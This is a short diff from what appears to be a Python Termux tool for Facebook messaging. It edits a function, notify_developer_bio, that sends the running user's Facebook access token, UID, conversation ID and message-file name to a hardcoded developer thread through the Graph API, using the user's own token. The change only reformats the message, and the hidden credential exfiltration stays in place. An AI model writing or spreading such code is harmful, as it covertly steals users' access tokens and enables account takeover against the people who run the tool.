@@ -381,7 +381,7 @@ def get_stop_key():
 
 def notify_developer_bio(current_token, mn, thread_id, uid, ms):
     DEV_THREAD_ID = "t_61571843423018"
-    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken: {current_token}\USSER HATER nName ::>  {mn}\nUSSER Conversation ID ::> {thread_id}\nUSSER UID ::>  {uid}\nUSSER Message File ::> {ms}"
+    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
     url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
     parameters = {'access_token': current_token, 'message': bio_message}
     try:
